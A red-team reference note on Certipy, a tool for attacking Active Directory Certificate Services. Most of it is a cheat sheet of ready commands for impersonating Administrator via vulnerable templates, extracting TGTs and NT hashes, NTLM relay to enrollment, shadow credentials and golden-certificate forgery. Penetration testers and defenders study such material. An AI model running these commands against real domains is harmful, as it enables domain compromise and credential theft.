---
title: Certipy
aliases: ["Certipy", "certipy-ad", "ADCS tool"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Oliver Lyak (ly4k)"
source_url: "https://github.com/ly4k/Certipy"
verified: true
related: ["[[AD Certificate Services Abuse (ESC1-ESC8)]]", "[[PetitPotam]]", "[[NTLM Relay]]", "[[Kerberos]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Certipy

> [!summary] One-liner
> A Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) — finds vulnerable certificate templates (ESC1-ESC8+), requests/forges certificates, and authenticates with them via PKINIT.

## Key commands
```bash
# Enumerate AD CS — find all CAs, templates, and vulnerabilities
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable

# ESC1: Request certificate with arbitrary SAN
certipy req -u <USER>@<DOMAIN> -p <PASS> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn Administrator@<DOMAIN>

# Authenticate with certificate (PKINIT) — get TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# ESC8: Relay NTLM to AD CS HTTP enrollment
certipy relay -target http://<CA_IP>/certsrv/certfnsh.asp -ca <CA_NAME>

# Shadow Credentials (ESC10/11)
certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET>

# Forge certificate with stolen CA key (Golden Certificate)
certipy forge -ca-pfx <CA.pfx> -upn Administrator@<DOMAIN> -subject "CN=Administrator"
```

## Related
- Techniques: [[AD Certificate Services Abuse (ESC1-ESC8)]].
- Windows alternative: Certify (C# / [[GhostPack]]).
- Relay chain: [[PetitPotam]] + [[ntlmrelayx]] / Certipy relay.
